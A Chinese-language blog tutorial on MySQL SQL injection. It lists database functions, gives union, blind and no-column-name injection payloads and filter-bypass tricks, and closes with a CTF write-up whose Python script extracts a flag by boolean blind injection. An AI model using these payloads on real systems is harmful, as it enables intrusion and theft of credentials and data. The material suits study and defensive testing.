<!DOCTYPE html>

<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0">

  <meta name="description" content="kpa1on的博客">


<link rel="alternate" href="/atom.xml" title="kpa1on&#39;s Blog" type="application/atom+xml">
<meta name="theme-color" content="#a1d0f6">
<title>SQL注入学习 - kpa1on&#39;s Blog</title>
<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<link rel="shortcut icon" href="/favicon.png">

<link rel="stylesheet" href="/css/style.css">

<nav class="main-nav">
	
	    <a href="/">← 主页</a>
	
	
	    <a href="/">home</a>
	
	    <a href="/about">about</a>
	
	    <a href="/tags">tags</a>
	
	    <a href="/categories">categories</a>
	
	    <a href="/archives">archives</a>
	
	<a class="cta" href="/atom.xml" data-no-instant>订阅</a>
</nav>

<section id="wrapper">
    <article class="post">
    <header>
        
            <h1>SQL注入学习</h1>
        
        <h2 class="headline">Mar 22 2022
        
        </h2>
    </header>
</article>
<section id="post-body"><meta name="referrer" content="no-referrer"/>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><span id="more"></span>

<h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system_user()——系统用户名</span><br><span class="line">user()——用户名</span><br><span class="line">current_user()——当前用户名</span><br><span class="line">session_user()——链接数据库的用户名</span><br><span class="line">database()——数据库名</span><br><span class="line">version()——数据库版本</span><br><span class="line">@@datadir——数据库路径</span><br><span class="line">@@basedir——数据库安装路径</span><br><span class="line">@@version_conpile_os——操作系统</span><br></pre></td></tr></table></figure>

<h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ABS(x)   返回x的绝对值</span><br><span class="line">BIN(x)   返回x的二进制（OCT返回八进制，HEX返回十六进制）</span><br><span class="line">CEILING(x)   返回大于x的最小整数值</span><br><span class="line">EXP(x)   返回值e（自然对数的底）的x次方</span><br><span class="line">FLOOR(x)   返回小于x的最大整数值</span><br><span class="line">GREATEST(x1,x2,...,xn)返回集合中最大的值</span><br><span class="line">LEAST(x1,x2,...,xn)      返回集合中最小的值</span><br><span class="line">LN(x)                    返回x的自然对数</span><br><span class="line">LOG(x,y)返回x的以y为底的对数</span><br><span class="line">MOD(x,y)                 返回x/y的模（余数）</span><br><span class="line">PI()返回pi的值（圆周率）</span><br><span class="line">RAND()返回０到１内的随机值,可以通过提供一个参数(种子)使RAND()随机数生成器生成一个指定的值。</span><br><span class="line">ROUND(x,y)返回参数x的四舍五入的有y位小数的值</span><br><span class="line">SIGN(x) 返回代表数字x的符号的值</span><br><span class="line">SQRT(x) 返回一个数的平方根</span><br><span class="line">TRUNCATE(x,y)            返回数字x截短为y位小数的结果</span><br></pre></td></tr></table></figure>

<h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AVG(col)返回指定列的平均值</span><br><span class="line">COUNT(col)返回指定列中非NULL值的个数</span><br><span class="line">MIN(col)返回指定列的最小值</span><br><span class="line">MAX(col)返回指定列的最大值</span><br><span class="line">SUM(col)返回指定列的所有值之和</span><br><span class="line">GROUP_CONCAT(col) 返回由属于一组的列值连接组合而成的结果</span><br></pre></td></tr></table></figure>

<h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ASCII(char)返回字符的ASCII码值</span><br><span class="line">BIT_LENGTH(str)返回字符串的比特长度</span><br><span class="line">CONCAT(s1,s2...,sn)将s1,s2...,sn连接成字符串</span><br><span class="line">CONCAT_WS(sep,s1,s2...,sn)将s1,s2...,sn连接成字符串，并用sep字符间隔</span><br><span class="line">INSERT(str,x,y,instr) 将字符串str从第x位置开始，y个字符长的子串替换为字符串instr，返回结果</span><br><span class="line">FIND_IN_SET(str,list)分析逗号分隔的list列表，如果发现str，返回str在list中的位置</span><br><span class="line">LCASE(str)或LOWER(str) 返回将字符串str中所有字符改变为小写后的结果</span><br><span class="line">LEFT(str,x)返回字符串str中最左边的x个字符</span><br><span class="line">LENGTH(s)返回字符串str中的字符数</span><br><span class="line">LTRIM(str) 从字符串str中切掉开头的空格</span><br><span class="line">POSITION(substr,str) 返回子串substr在字符串str中第一次出现的位置</span><br><span class="line">QUOTE(str) 用反斜杠转义str中的单引号</span><br><span class="line">REPEAT(str,srchstr,rplcstr)返回字符串str重复x次的结果</span><br><span class="line">REVERSE(str) 返回颠倒字符串str的结果</span><br><span class="line">RIGHT(str,x) 返回字符串str中最右边的x个字符</span><br><span class="line">RTRIM(str) 返回字符串str尾部的空格</span><br><span class="line">STRCMP(s1,s2)比较字符串s1和s2</span><br><span class="line">TRIM(str)去除字符串首部和尾部的所有空格</span><br><span class="line">UCASE(str)或UPPER(str) 返回将字符串str中所有字符转变为大写后的结果</span><br></pre></td></tr></table></figure>

<h3 id="加密函数"><a href="#加密函数" class="headerlink" title="加密函数"></a>加密函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">AES_ENCRYPT(str,key)  返回用密钥key对字符串str利用高级加密标准算法加密后的结果，调用AES_ENCRYPT的结果是一个二进制字符串，以BLOB类型存储</span><br><span class="line">AES_DECRYPT(str,key)  返回用密钥key对字符串str利用高级加密标准算法解密后的结果</span><br><span class="line">DECODE(str,key)   使用key作为密钥解密加密字符串str</span><br><span class="line">ENCRYPT(str,salt)   使用UNIXcrypt()函数，用关键词salt(一个可以惟一确定口令的字符串，就像钥匙一样)加密字符串str</span><br><span class="line">ENCODE(str,key)   使用key作为密钥加密字符串str，调用ENCODE()的结果是一个二进制字符串，它以BLOB类型存储</span><br><span class="line">MD5()    计算字符串str的MD5校验和</span><br><span class="line">PASSWORD(str)   返回字符串str的加密版本，这个加密过程是不可逆转的，和UNIX密码加密过程使用不同的算法。</span><br><span class="line">SHA()    计算字符串str的安全散列算法(SHA)校验和</span><br></pre></td></tr></table></figure>

<h2 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h2><h3 id="1-判断是否存在注入"><a href="#1-判断是否存在注入" class="headerlink" title="1.判断是否存在注入"></a>1.判断是否存在注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure>

<h3 id="2-判断字段数"><a href="#2-判断字段数" class="headerlink" title="2.判断字段数"></a>2.判断字段数</h3><p>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br></pre></td></tr></table></figure>

<p>使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure>

<h3 id="3-确定显示数据的字段位置"><a href="#3-确定显示数据的字段位置" class="headerlink" title="3.确定显示数据的字段位置"></a>3.确定显示数据的字段位置</h3><p>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure>

<h3 id="4-在回显数据的字段上注入payload"><a href="#4-在回显数据的字段上注入payload" class="headerlink" title="4.在回显数据的字段上注入payload"></a>4.在回显数据的字段上注入payload</h3><p>在mysql 5.0版本之后，mysql默认在数据库中存放一个”<code>information_schema</code>“的数据库，在该库中，需要记住三个表名，分别是schemata、tables、columns。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据库名</span><br><span class="line">-1&#x27; union select 1,2,database()--+</span><br><span class="line">-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">表名</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line">字段名</span><br><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line">数据</span><br><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br></pre></td></tr></table></figure>

<p>当<code>information_schema</code>被屏蔽时，可以使用其他表：</p>
<p><strong>innodb表</strong></p>
<p>MySQL 5.6 及以上版本存在<code>innodb_index_stats</code>，<code>innodb_table_stats</code>两张表，其中包含新建立的库和表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查表</span><br><span class="line">select table_name from mysql.innodb_table_stats where database_name = database(); </span><br><span class="line">select table_name from mysql.innodb_index_stats where database_name = database();</span><br><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=schema()--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>sys表</strong></p>
<p>sys表 在MySQL 5.7中默认存在，在mysql5.6版本以上可以手动导入，sys系统数据库结合了information_schema和performance_schema的相关数据。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#包含in</span><br><span class="line">SELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();</span><br><span class="line">SELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;</span><br><span class="line">#不包含in</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();</span><br><span class="line">SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;</span><br><span class="line">#通过表文件的存储路径获取表名</span><br><span class="line">SELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();</span><br><span class="line">SELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();</span><br><span class="line"></span><br><span class="line">#查询指定库的表（若无则说明此表从未被访问）</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">SELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema=&#x27;mspwd&#x27; GROUP BY table_name;</span><br><span class="line">#统计所有访问过的表次数:库名,表名,访问次数</span><br><span class="line">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by</span><br><span class="line">table_schema,table_name order by io desc;</span><br><span class="line">#查看所有正在连接的用户详细信息</span><br><span class="line">SELECT user,db,command,current_statement,last_statement,time FROM sys.session;</span><br><span class="line">#查看所有曾连接数据库的IP,总连接次数</span><br><span class="line">SELECT host,total_connections FROM sys.host_summary;</span><br></pre></td></tr></table></figure>

<p><strong>Performance Schema</strong></p>
<p>Performance Schema最早在MYSQL 5.5中引入，而现在5.6、5.7、8.0中Performance-Schema又添加了更多的监控项，用于监控MySQL server在一个较低级别的运行过程中的资源消耗、资源等待等情况。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();</span><br><span class="line">SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();</span><br></pre></td></tr></table></figure>

<h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p>方法一：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql 8.0.19`新增语句`table</span><br><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br><span class="line"></span><br><span class="line">可以把table t简单理解成select * from t，和select的区别在于</span><br><span class="line">table总是显示表的所有列</span><br><span class="line">table不允许任何的行过滤;也就是说，TABLE不支持任何WHERE子句。</span><br><span class="line">可以用来盲注表名</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">handler users open as hd; #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler hd read first; #读取指定表/句柄的首行数据</span><br><span class="line">handler hd read next; #读取指定表/句柄的下一行数据</span><br><span class="line">handler hd close; #关闭句柄</span><br></pre></td></tr></table></figure>

<p>方法三：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prepare xxx from &quot;sql语句&quot;;</span><br><span class="line">execute xxx;</span><br><span class="line"></span><br><span class="line">由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤</span><br><span class="line">比如过滤了select</span><br><span class="line">PREPARE st from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; * from `1919810931114514`&#x27;);EXECUTE st;#</span><br></pre></td></tr></table></figure>

<h3 id="information-schema被过滤"><a href="#information-schema被过滤" class="headerlink" title="information_schema被过滤"></a>information_schema被过滤</h3><p>方法一：</p>
<p>利用mysql5.7新增的<code>sys.schema_auto_increment_columns</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是sys数据库下的一个视图，基础数据来自与information_schema,他的作用是对表的自增ID进行监控，也就是说，如果某张表存在自增ID，就可以通过该视图来获取其表名和所在数据库名</span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>利用<code>sys.schema_table_statistics_with_buffer</code></p>
<p>方法三：</p>
<p>利用mysql默认存储引擎innoDB携带的表 <code>mysql.innodb_table_stats</code>和</p>
<p>  <code>mysql.innodb_index_stats</code></p>
<p>方法四：</p>
<p>无列名注入</p>
<h4 id="join-using注列名"><a href="#join-using注列名" class="headerlink" title="join-using注列名"></a>join-using注列名</h4><p>通过系统关键词join可建立两个表之间的内连接。通过对想要查询列名所在的表与其自身内连接，会由于冗余的原因(相同列名存在)，而发生错误。并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">爆表</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name) from sys.schema_auto_increment_columns where table_schema=database()--+</span><br><span class="line">schema_table_statistics_with_buffer</span><br><span class="line">?id=-1&#x27; union all select 1,2,group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database()--+</span><br><span class="line">获取第一列的列名</span><br><span class="line">?id=-1&#x27; union all select * from (select * from users as a join users as b)as c--+</span><br><span class="line">获取次列及后续列名</span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users b using(id,username))c--+</span><br><span class="line">?id=-1&#x27; union all select*from (select * from users as a join users b using(id,username,password))c--+</span><br><span class="line">数据库中as主要作用是起别名，常规来说都可以省略，但是为了增加可读性，不建议省略。</span><br></pre></td></tr></table></figure>

<h4 id="利用普通子查询"><a href="#利用普通子查询" class="headerlink" title="利用普通子查询"></a>利用普通子查询</h4><p>假设 <code>user</code>表中存在 列名为<code>id</code>、<code>name</code>、<code>pass</code>、<code>mail</code>、<code>phone</code>，那么利用如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,5 union select * from users; （前提是先尝试出sql中总共有几个列）</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170246019-1523606623.png" alt="image-20220322170246440"></p>
<p>可见数字与users中的列相应，接着，就可以继续使用数字来对应列进行查询，如3对应了表里面的pass：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select `3` from (select 1,2,3,4,5 union select * from users)a;</span><br><span class="line">//就相当于select pass from (select 1,2,3,4,5 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170339848-796249324.png" alt="image-20220322170340541"></p>
<p>当反引号 &#96; 不能使用的时候，我们可以使用别名来代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2,3 as b,4,5 union select * from users)a;</span><br><span class="line">select group_concat(b,c) from (select 1,2,3 as b,4 as c,5 union select * from users)a;  //在注入中查询多个列：</span><br></pre></td></tr></table></figure>

<p>过滤了逗号，可以利用join</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//无逗号，有join版本</span><br><span class="line">select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</span><br></pre></td></tr></table></figure>



<h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>这里列举一个之前参加的中国工业互联网安全大赛联通赛题的一道无列名注入题</p>
<p>题目就一个登录页面，过滤的源码如下，实际环境可以采⽤fuzz，对常⽤关键字进⾏探测，将被过滤的找出来 </p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322170811575-724738630.png" alt="image-20220322170812383"></p>
<p>通过观察，过滤中最主要将各种用于比较的符号都进行了过滤，只留下了⼀个就是in<br>并且登录接，sql没有回显，明显是布尔盲注，经过测试，payload如下：  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password:</span><br><span class="line">abcabc&#x27;/**/or/**/ord(mid((select/**/database()),0,1))/**/in/**/(&#x27;127&#x27;)#</span><br></pre></td></tr></table></figure>

<p>还有⼀个考点就是这里过滤了<code>information</code>，表面上看没办法常规获取表明和字段名，这里采用的绕过方法是使用<code>sys.schema_table_statistics</code>这个表。这个表中存储了所有的数据库和数据表，但是没有字段名 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema</span><br><span class="line">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;xxx&#x27;) GROUP BY table_name limit 0,1</span><br></pre></td></tr></table></figure>

<p>利用无列名注入获取表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a.1 from (select 1,2 union select * from f1a91sH3RE)a limit 1,1</span><br></pre></td></tr></table></figure>

<p>或者想办法获取列名：这里采取的⽅式为:sys.x$statement_analysis这个表，这个表会记录最近用过的语句，因为题目环境为docker，因此建表语句⼀般都存储在该表中，没有被清空，因此可以通过注入这个表，获取到完整的建表语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT query FROM sys.x$statement_analysis</span><br></pre></td></tr></table></figure>

<p>编写python脚本，获取数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">url = &#x27;http://127.0.0.1:8081/index.php&#x27;</span><br><span class="line"></span><br><span class="line">select = &#x27;password&#x27; #flag-is-not-here</span><br><span class="line">select = &#x27;SELECT table_schema FROM sys.schema_table_statistics GROUP BY</span><br><span class="line">table_schema&#x27; #ctfgame 库名</span><br><span class="line">select = &quot;SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;ctfgame&#x27;) GROUP BY table_name limit 0,1&quot; # f1a91sH3RE 表名</span><br><span class="line">select = &quot;SELECT table_name FROM sys.schema_table_statistics WHERE table_schema in (&#x27;ctfgame&#x27;) GROUP BY table_name limit 1,1&quot; # users</span><br><span class="line">select = &quot;SELECT query FROM sys.x$statement_analysis limit 3,1&quot; # users</span><br><span class="line">select = &quot;SELECT f1aG123 FROM f1a91sH3RE&quot;</span><br><span class="line"># select = &quot;select * from f1a91sH3RE limit 0,1&quot; #注⼊失败 说明不⽌⼀列</span><br><span class="line"># select = &quot;select a.1 from (select 1,2 union select * from f1a91sH3RE)a limit 1,1&quot; #假设有2列 注⼊成功 flag&#123;af65039d-6f2f-9524-d896-e630d03c074c&#125;</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">	for j in range(1,130):</span><br><span class="line">		data=&#123;</span><br><span class="line">			&#x27;username&#x27; : &#x27;admin&#x27;,</span><br><span class="line">			&#x27;password&#x27; : f&quot;abcabc&#x27; or ord(mid((&#123;select&#125;),&#123;i&#125;,1)) in</span><br><span class="line">(&#x27;&#123;j&#125;&#x27;)#&quot;.replace(&#x27; &#x27;, &quot;/**/&quot;)</span><br><span class="line">		&#125; </span><br><span class="line">		r = req.post(url, data)</span><br><span class="line">		if &#x27;hacker&#x27; in r.text:</span><br><span class="line">			print(&quot;hacker&quot;)</span><br><span class="line">			exit(0)</span><br><span class="line">		if &#x27;wrong&#x27; not in r.text:</span><br><span class="line">			res += chr(j)</span><br><span class="line">			print(res)</span><br><span class="line">			break</span><br><span class="line">		if j == 129:</span><br><span class="line">			exit(0)</span><br></pre></td></tr></table></figure>

<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#    %23    --+或-- -    ;%00      用引号进行闭合</span><br></pre></td></tr></table></figure>

<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 大小写绕过</span><br><span class="line">-1&#x27; UnIoN SeLeCt 1,2,database()--+</span><br><span class="line"># 双写绕过</span><br><span class="line">-1&#x27; uniunionon selselectect 1,2,database()--+</span><br><span class="line"># 字符串拼接绕过</span><br><span class="line">1&#x27;;set @a=concat(&quot;sel&quot;,&quot;ect * from users&quot;);prepare sql from @a;execute sql;</span><br></pre></td></tr></table></figure>

<h3 id="过滤-and、or-绕过"><a href="#过滤-and、or-绕过" class="headerlink" title="过滤 and、or 绕过"></a>过滤 and、or 绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and =&gt; &amp;&amp;</span><br><span class="line">or =&gt; ||</span><br></pre></td></tr></table></figure>

